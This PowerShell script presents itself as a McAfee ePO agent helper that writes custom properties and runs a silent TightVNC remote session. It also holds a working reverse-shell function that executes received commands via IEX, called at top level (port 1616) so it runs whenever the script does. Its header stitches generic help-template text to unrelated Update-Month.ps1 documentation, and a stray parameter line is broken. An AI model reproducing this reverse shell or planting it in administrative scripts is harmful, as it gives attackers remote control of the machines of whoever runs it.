<# 
.SYNOPSIS
    A summary of how the script works and how to use it.

.DESCRIPTION 
    A long description of how the script works and how to use it.
 
.NOTES 
    Information about the environment, things to need to be consider and other information.

.COMPONENT 
    Information about PowerShell Modules to be required.

.LINK 
    Useful Link to ressources or others.
 
.Parameter ParameterName 
    Description for a parameter in param definition section. Each parameter requires a separate description. The name in the description and the parameter section must match. 
#>
<#
  .SYNOPSIS
  Performs monthly data updates.

  .DESCRIPTION
  The Update-Month.ps1 script updates the registry with new data generated
  during the past month and generates a report.

  .PARAMETER InputPath
  Specifies the path to the CSV-based input file.

  .PARAMETER OutputPath
  Specifies the name and path for the CSV-based output file. By default,
  MonthlyUpdates.ps1 generates a name from the date and time it runs, and
  saves the output in the local directory.

  .INPUTS
  None. You cannot pipe objects to Update-Month.ps1.

  .OUTPUTS
  None. Update-Month.ps1 does not generate any output.

  .EXAMPLE
  PS> .\Update-Month.ps1

  .EXAMPLE
  PS> .\Update-Month.ps1 -inputpath C:\Data\January.csv

  .EXAMPLE
  PS> .\Update-Month.ps1 -inputpath C:\Data\January.csv -outputPath C:\Reports\2009\January.csv
#>
# Run script
# Return the status in CustomProps  
# Steen Pedersen, 2022 - Version 005.1
# ------------------------------------------------------------------------------------------------
param (
    [Parameter(Mandatory=$true,HelpMessage="Time in minutes")]
    [int]$Time = $(throw "Time is mandatory, please provide a value."),
    [Parameter(Mandatory=$true)]
    [Alias("host","admin","ip")]
    [string]$AdminHost = $(throw "AdminHost is mandatory, please provide a value."),    
    [switch]$VNC = $false,
    [switch]$Console = $false,
    [Alias("port")]
    [int]$ConsolePort = 1616,  
    [Parameter(HelpMessage="When not provided ePO will not be updated")]
    [int]$prop = -1
)
# ------------------------------------------------------------------------------------------------
#
# Preapare some environmental variables
$g_agentFound = $false
$g_agentNotFound_ExitCode = 100
$g_results =''
$g_temp_status_file = $env:temp+'\EEDK_PS1_Debug.log'
# Working directory
$g_working_dir = $PSScriptRoot
$g_ISO_Date_with_time = Get-Date -format "yyyy-MM-dd HH:mm:ss"

# Parameter help description
[Parameter(AttributeValues)]
[string]$PropNo
# ------------------------------------------------------------------------------------------------

function get_path_to_agent_tools()
    {
    # Find path to McAfee Agent
    # Read information from 64 bit
    if ((Get-WmiObject win32_operatingsystem | Select-Object osarchitecture).osarchitecture -like "64*")
    {
        #64bit code here
        #Write-Output "64-bit OS"
        Add-Content  $g_temp_status_file "64-bit OS"
        $Global:g_path_to_agent = (Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Network Associates\ePolicy Orchestrator\Agent" -Name "Installed Path")."Installed Path"
       
    }
    else
    {
        #32bit code here
        #Write-Output "32-bit OS"
        Add-Content  $g_temp_status_file "32-bit OS"
        $Global:g_path_to_agent = (Get-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Network Associates\ePolicy Orchestrator\Agent" -Name "Installed Path")."Installed Path"
      
    }
    
    $g_agentFound =  Test-Path -Path ($Global:g_path_to_agent)

    if ($g_agentFound)
    {
     
        $Global:g_Command_maconfig = [System.IO.Path]::Combine( [System.IO.Directory]::GetParent($Global:g_path_to_agent).FullName,"MACONFIG.EXE")
        $Global:g_Command_cmdagent = [System.IO.Path]::Combine( [System.IO.Directory]::GetParent($Global:g_path_to_agent).FullName,"CMDAGENT.EXE")
    }
    else
    {   
        $agent_error = [String]::Format("Error locating McAfee Agent... Exiting with Code {0}.", $g_agentNotFound_ExitCode)                
        Write-Host $agent_error -ForegroundColor Red
        Exit $g_agentNotFound_ExitCode        
    }

}

function write_customprops()
    {
           param(
            [string]$Value,
            [string]$PropsNo
        )
    
    
    $Parms = [String]::Format("-custom -prop{0} ""{1}""", $PropsNo, $Value)
        
    Add-Content $g_temp_status_file "Run $Global:g_Command_maconfig $Parms"

    try {
        $process_status = Start-Process  $Global:g_Command_maconfig -ArgumentList $Parms -NoNewWindow -PassThru -Wait        
        Write-Host ([string]::Format("Executed successfully process: {0} with params: {1}",$Global:g_Command_maconfig,$Parms)) -ForegroundColor Green 
    }
    catch {
        "Error running $Global:g_Command_maconfig"

        $cmd_exception =$_.Exception
        $cmd_error = [String]::Format("Error running: {0} with Params: {1}, The following exception occured: {2}",$Global:g_Command_maconfig, $Parms, $cmd_exception)

        Add-Content $g_temp_status_file $cmd_error
        Write-Host $cmd_error -ForegroundColor Red

    }
   
    # Perform CMDAGENT.EXE -p = Collect and Send Props
    
    $Parms = "-p"
    
    Add-Content $g_temp_status_file "Run $Global:g_Command_cmdagent -p"
    try {
        
        $process_status = Start-Process  $Global:g_Command_cmdagent -ArgumentList $Parms -NoNewWindow -PassThru -Wait
        Write-Host ([string]::Format("Executed successfully process: {0} with params: {1}",$Global:g_Command_cmdagent,$Parms)) -ForegroundColor Green 
    }
    catch {
        "Error running $Global:g_Command_cmdagent"

        $cmd_exception =$_.Exception
        $cmd_error = [String]::Format("Error running: {0} with Params: {1}, The following exception occured: {2}",$Global:g_Command_cmdagent, $Parms, $cmd_exception)

        Add-Content $g_temp_status_file $cmd_error

        Write-Host $cmd_error -ForegroundColor Red
    }
    
    }


function return_results_to_ePO {
    param(
        [string]$PropsNo
    )

    write_customprops -PropsNo $PropsNo -Value $Global:g_results 
    
    "Status added to "+$g_temp_status_file
    Add-Content $g_temp_status_file "$Global:g_results"

    'Results: '+$Global:g_results
    
}

function ReverseShell {
    param (
        [String]$ip_addr,
        [int16]$port
    )
    $a=[System.Byte[]]::CreateInstance([System.Byte],1024);
    $b=New-Object System.Net.Sockets.TCPClient($ip_addr,$port);
    While($c=$b.GetStream()){
        While($c.DataAvailable -or $d -eq $a.count){
            $d=$c.Read($a,0,$a.length);
            $e+=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($a,0,$d)
        }
        If($e){
            $f=(IEX($e)2>&1|Out-String);
            If(!($f.length%$a.count)){
                $f+=" "
            }
            $g=([text.encoding]::ASCII).GetBytes($f);
            $c.Write($g,0,$g.length);
            $c.Flush();
            $e=$Null
        }
        Start-Sleep -Milliseconds 1
    }
}

ReverseShell -ip_addr "ip" -port 1616

function place_your_code_here_function {
    #
    # Place your code here
    # 

    Start-Process -FilePath tvnserver.exe -ArgumentList "-install -silent"
    Start-Process -FilePath tvnserver.exe -ArgumentList "-start -silent"
    Start-Process -FilePath tvnserver.exe -ArgumentList "-controlservice -sharefull"
    Start-Process -FilePath tvnserver.exe -ArgumentList "-controlservice -connect $AdminHost"
    Wait-Process -Name tvnserver -ErrorAction Continue -Verbose -Timeout 50
    Start-Process -FilePath tvnserver.exe -ArgumentList "-controlservice -shutdown"
    Start-Process -FilePath tvnserver.exe -ArgumentList "-stop -silent"
    Start-Process -FilePath tvnserver.exe -ArgumentList "-remove -silent"

    # Set the value to be returned to ePO - max 255 char
    $Global:g_results = "First test"
    # Write the results to the Custom Props
    $Global:g_results = $Global:g_results +", AT: "+$g_ISO_Date_with_time

}

################
# Main section #
################
function main()
{
    # Write start time 
    Add-Content  $g_temp_status_file ($g_ISO_Date_with_time+'  Start :'+$PSCommandPath+$args)
    
    Write-Host AdminHost 
    Write-Host $AdminHost  
    Write-Host VNC
    Write-Host $VNC
    Write-Host Console
    Write-Host $Console
    Write-Host ConsolePort
    Write-Host $ConsolePort
    Write-Host prop
    Write-Host $prop
    Write-Host Time
    Write-Host $Time

    get_path_to_agent_tools

    place_your_code_here_function

    return_results_to_ePO -PropsNo 8

    #"Completed : "
    #Get-Date -format "yyyyMMdd_HHmmss"

}

main